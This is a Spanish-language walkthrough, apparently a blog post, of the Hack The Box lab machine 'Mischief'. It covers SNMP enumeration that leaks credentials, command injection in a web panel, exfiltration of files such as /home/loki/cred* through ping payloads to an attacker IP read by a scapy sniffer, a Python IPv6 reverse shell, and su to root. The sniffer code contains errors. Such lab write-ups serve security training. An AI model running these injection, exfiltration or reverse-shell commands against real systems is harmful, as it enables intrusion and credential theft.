---
layout: post
title: HTB_Mischief
date: 2023/07/10
slug: HTB_Mischief
heroImage: /assets/machines.jpg
---

# Mischief {-}

## Introduccion {-}

La maquina del dia se llama Mischief.

El replay del live se puede ver aqui

[![S4vitaar Mischief maquina](https://img.youtube.com/vi/Q6vlt9BlnWg/0.jpg)](https://www.youtube.com/watch?v=Q6vlt9BlnWg)

No olvideis dejar un like al video y un commentario...
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.92
```
ttl: 63 -> maquina Linux

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.92
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.92 -oG allPorts 
extractPorts allPorts
nmap -sCV -p22,3366 10.10.10.92 -oN targeted
```


| Puerto | Servicio                                         | Que se nos occure? | Que falta? |
| ------ | ------------------------------------------------ | ------------------ | ---------- |
| 22     | ssh                                              | Coneccion directa  |            |
| 3366   | http calandar and contacts python BaseHTTPServer |                    |            |


### Analysando el BaseHTTPServer {-}

Con firefox entramos la url 
```bash
 http://10.10.10.92:3366 
```
. Vemos un panel basic auth. Intentamos credenciales
por defecto

```bash
admin:admin
guest:guest
riley:reid
```

No podemos connectar pero encontramos una cadena en base64

```bash
echo "cmlsZXk6cmVpZA==" | base64 -d; echo

#Output
riley:reid
```

Parece que nos reporta la credenciales entradas por base64.

#### Whatweb {-}

```bash
whatweb http://10.10.10.92:3366/
```

vemos que es Python 2.7.15rc1 con un WWW-Authenticate pero nada mas. Como cada intento de routa con firefox nos lleva al panel de
authenticacion, Fuzzear no tiene sentido.

### Scaneando por UDP {-}

```bash
nmap -sU --top-ports 500 -v -n 10.10.10.92
```

encontramos el puerto 161 abierto

```bash
nmap -sCV -p161 -sU 10.10.10.92 -oN udpScan
```

### Enumerando el snmp {-}

```bash
onesixtyone 10.10.10.92 -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt
```

Vemos que la community string es **public**


```bash
snmpwalk -v2c -c public 10.10.10.92
snmpwalk -v2c -c public 10.10.10.92 ipAddressType
```

Aqui no vemos nada muy interessante. Lo unico es la IPV6 address de la maquina.
Podemos intentar scanear con nmap con la IPV6. Primero tenemos que tocar la ip

```bash
de:ad:be:ef:00:00:00:00:02:50:56:ff:fe:b9:55:91
dead:beef:0250:56ff:feb9:5591
ping -c 1 dead:beef:0250:56ff:feb9:5591
nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn -6 dead:beef:0250:56ff:feb9:5591 -oG allPortsipv6
extractPorts allPortsipv6
nmap -sCV -p22,80 -6 dead:beef:0250:56ff:feb9:5591 -oN targetedipv6
```

| Puerto | Servicio | Que se nos occure? | Que falta? |
| ------ | -------- | ------------------ | ---------- |
| 22     | ssh      | Coneccion directa  |            |
| 80     | http     |                    |            |


### Analysando la web en ipv6 {-}

Con firefox se puede ver ipv6 poniendo la ip entre corchetes 
```bash
 [dead:beef:0250:56ff:feb9:5591] 
```
 y vemos un panel
de authenticacion. Intentamos credenciales por defecto pero no encontramos nada.

### SNMPWALK mas contundente {-}

Como sabemos que el puerto 3366 es un SimpleHTTPServer de python2.7, miramos si podemos 
recuperar mas informaciones para este servicio

```bash
snmpwalk -v2c -c public 10.10.10.92 hrSWRunName
snmpwalk -v2c -c public 10.10.10.92 hrSWRunName | grep python
snmpwalk -v2c -c public 10.10.10.92 hrSWRunTable | grep "568"
```

Aqui vemos credenciales 
```bash
 loki:godofmischiefisloki 
```
. Si nos connectamos con estas credenciales en el puerto 3366, podemos entrar
y vemos una tabla con otras credenciales. Vamos a la pagina del ipv6 y intentamos credenciales.

```bash
loki:godofmischiefisloki
loki:trickeryyanddeceit
admin:godofmischiefisloki
admin:trickeryyanddeceit
administrator:godofmischiefisloki
administrator:trickeryyanddeceit
```

vemos con la ultima credencial nos podemos connectar. Vemos un panel de ejecucion de comandos.

## Vulnerability Assessment {-}

### Panel de ejecucion de commandos {-}

Intentamos ver si tenemos connectividad.

1. Nos ponemos en escucha por traza ICMP

    ```bash
    tcpdump -i tun0 icmp
    ```

1. Lanzamos un ping

    ```bash
    ping -c 2 10.10.14.29
    ```

Vemos que recuperamos las trazas.

Intentamos otros commandos

```bash
ping -c 2 10.10.14.29;
ping -c 2 10.10.14.29; whoami
ping -c 2 10.10.14.29; id
```

Vemos que poniendo el *punto y coma* podemos ver un resultado en la web pero no vemos el resultado de id o de whoami. Pero si intentamos

```bash
id;
```

Vemos el resultado en la web. Aqui la movida seria de poder leer archivos desde una traza ICMP, mejor dicho con un ping.

### Local File Inclusion con un ping {-}

Es possible enviar datos con el comando ping con el parametro -p. Primero nos creamos un script en python que va a funccionar
como un sniffer.

```python
#!/usr/bin/python3

from scapy.all import *
import signal, time

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

#Ctrl+C
signal.signal(signal.SINGINT, def_handler)

def data_parser(packet):
    if packet.haslayer(ICMP):
        if packet.[ICMP].type == 8:
            data = packet[ICMP].load[-4:].decode("utf-8")
            print(data, flush=True, end='')

if __name__ == '__main__':
    sniff(iface='tun0', prn=data_parser)
```

Si desde el panel de comandos de la web le ponemos:

```bash
xxd -p -c 4 /etc/hosts | while read line; do ping -c 1 -p $line 10.10.14.29; done
```

podemos leer ficheros internos de la maquina victima con ping.

Como en la web vemos un mensaje que hay un fichero credentials en el directorio personnal, miramos para leerlo con el commando

```bash
xxd -p -c 4 /home/loki/cred* | while read line; do ping -c 1 -p $line 10.10.14.29; done
```

y vemos un password 
```bash
 lokiisthebestnorsegod 
```
.## Vuln exploit & Gaining Access {-}

### Ganando acceso con ssh {-}

Como tenemos la contraseña del usuario loki, no connectamos a la maquina victima con 
ssh.

```bash
ssh loki@10.10.10.92
password: lokiisthebestnorsegod
```

y podemos visualizar la flag.

### Ganando acceso con ipv6 {-}

Tambien podriamos ganar acceso al systema por IPV6

1. Mirar con ifconfig nuestra ipv6
1. Ponernos en escucha por ipv6 con netcat

    ```bash
    nc -nv --listen dead:beef:2::101b 443
    ```

1. Entablar la reverse shell con python

    ```bash
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::101b",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
    ```

Y de esta manera vemos que ganamos acceso a la maquina victima como *www-data*

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
id
cat .bash_history
```

Aqui encontramos una nueva contraseña. Intentamos ponerla para root

```bash
su root

#Output
-bash: /bin/su: Permission denied

ls -la /bin/su
getfacl /bin/su
```

Podemos ver con el comando 
```bash
 getfacl /bin/su 
```
 que hay un privilegio especial que hace que el usuario loki solo pueda leer el binario **su**
pero sin poder ejecutarlo.

Como tenemos acceso a la maquina tambien con www-data, podemos desde hay lanzar el comando **su**

```bash
su root
Password: lokipasswordmischieftrickery

whoami

#Output
root

cat /root/root.txt
find / \-name root.txt 2>/dev/null
cat /usr/lib/gcc/x86_64-linux-gnu/7/root.txt
```

Ya somos root y podemos leer la flag.


